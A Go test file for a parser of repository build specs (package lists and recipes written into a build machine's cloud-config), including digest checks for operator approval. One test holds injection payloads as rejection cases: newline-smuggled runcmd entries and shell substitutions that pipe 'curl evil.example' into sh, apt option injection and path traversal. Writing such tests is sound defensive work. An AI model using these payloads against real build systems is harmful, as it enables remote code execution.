package repospec

import (
	"strings"
	"testing"
)

func TestParseReadsWhatARepositoryAsksFor(t *testing.T) {
	spec, err := Parse([]byte(`
packages:
  - libpq-dev
  - imagemagick
recipe: |
  curl -fsSL https://sh.rustup.rs | sh -s -- -y
`))
	if err != nil {
		t.Fatal(err)
	}
	if len(spec.Packages) != 2 {
		t.Fatalf("packages %v", spec.Packages)
	}
	if !strings.Contains(spec.Recipe, "rustup") {
		t.Fatalf("recipe %q", spec.Recipe)
	}
}

// A repository with the file and nothing in it gets the pool's image, not an
// empty layer on top of it.
func TestParseAcceptsAFileThatAsksForNothing(t *testing.T) {
	for _, data := range []string{"", "# nothing yet\n", "packages: []\n"} {
		spec, err := Parse([]byte(data))
		if err != nil {
			t.Fatalf("%q: %v", data, err)
		}
		if !spec.Empty() {
			t.Fatalf("%q parsed to something: %+v", data, spec)
		}
	}
}

// The one that matters. A package name is written into the build machine's
// cloud-config as a YAML list item, so a name with a newline in it is not a
// broken package — it is more cloud-config, written by whoever can open a pull
// request against the repository.
func TestParseRefusesAPackageNameThatIsNotOne(t *testing.T) {
	for _, pkg := range []string{
		"git\n  - ca-certificates\nruncmd:\n  - curl evil.example | sh",
		"git\nwrite_files:",
		"-oAPT::Get::AllowUnauthenticated=true",
		"--allow-downgrades",
		"git; curl evil.example | sh",
		"$(curl evil.example)",
		"`id`",
		"../../etc/passwd",
		"Git",
		"",
		" git",
		"git ",
	} {
		if _, err := Parse([]byte("packages:\n  - " + quote(pkg) + "\n")); err == nil {
			t.Errorf("accepted %q as a package name", pkg)
		}
	}
}

// quote makes a YAML scalar out of anything, so the test can put a newline in
// a package name without writing invalid YAML around it.
func quote(s string) string {
	return `"` + strings.NewReplacer(`\`, `\\`, `"`, `\"`, "\n", `\n`).Replace(s) + `"`
}

func TestParseAcceptsTheNamesAptDoes(t *testing.T) {
	for _, pkg := range []string{
		"git", "libpq-dev", "g++", "python3.12", "lib32z1", "ca-certificates",
		"nodejs=20.11.1-1nodesource1", "openjdk-21-jdk-headless",
	} {
		if _, err := Parse([]byte("packages:\n  - " + pkg + "\n")); err != nil {
			t.Errorf("refused %q: %v", pkg, err)
		}
	}
}

// A repository that writes `packagess:` and is quietly given nothing would
// debug that by reading the daemon's source.
func TestParseRefusesAFieldItDoesNotKnow(t *testing.T) {
	if _, err := Parse([]byte("packagess:\n  - git\n")); err == nil {
		t.Fatal("accepted a field it does not act on")
	}
}

func TestParseRefusesMoreThanItWillRun(t *testing.T) {
	var many strings.Builder
	many.WriteString("packages:\n")
	for i := 0; i < MaxPackages+1; i++ {
		many.WriteString("  - git\n")
	}
	if _, err := Parse([]byte(many.String())); err == nil {
		t.Error("accepted more packages than it will install")
	}

	big := "recipe: |\n  " + strings.Repeat("x", MaxRecipeBytes+1) + "\n"
	if _, err := Parse([]byte(big)); err == nil {
		t.Error("accepted a recipe larger than it will run")
	}

	if _, err := Parse(make([]byte, MaxBytes+1)); err == nil {
		t.Error("read a file larger than it will read")
	}
}

// The digest is what an operator approves, so it has to be over what will run
// and nothing else. Comments, ordering and quoting are not what will run.
func TestDigestIgnoresHowTheFileIsWritten(t *testing.T) {
	one, err := Parse([]byte("packages: [git, curl]\nrecipe: echo hi\n"))
	if err != nil {
		t.Fatal(err)
	}
	two, err := Parse([]byte(`
# added by the platform team
packages:
  - curl   # for the health check
  - git
  - git
recipe: "echo hi"
`))
	if err != nil {
		t.Fatal(err)
	}
	if one.Digest() != two.Digest() {
		t.Fatalf("same request, different digests:\n  %s\n  %s", one.Digest(), two.Digest())
	}
}

// And the other half of it: anything that changes what runs has to change the
// digest, or an approved definition could be edited into a different one.
func TestDigestChangesWithEverythingThatRuns(t *testing.T) {
	base, err := Parse([]byte("packages: [git]\nrecipe: echo hi\n"))
	if err != nil {
		t.Fatal(err)
	}
	for _, other := range []string{
		"packages: [git, curl]\nrecipe: echo hi\n",
		"packages: [curl]\nrecipe: echo hi\n",
		"packages: [git]\nrecipe: echo bye\n",
		"packages: [git]\n",
		"recipe: echo hi\n",
	} {
		changed, err := Parse([]byte(other))
		if err != nil {
			t.Fatal(err)
		}
		if changed.Digest() == base.Digest() {
			t.Errorf("%q has the same digest as the original", other)
		}
	}
}

// A digest is 64 hex characters and a person comparing two of them is not.
func TestShortIsForReading(t *testing.T) {
	spec, err := Parse([]byte("packages: [git]\n"))
	if err != nil {
		t.Fatal(err)
	}
	if len(Short(spec.Digest())) != 12 {
		t.Fatalf("%q", Short(spec.Digest()))
	}
	if Short("abc") != "abc" {
		t.Fatal("mangled something that was already short")
	}
}
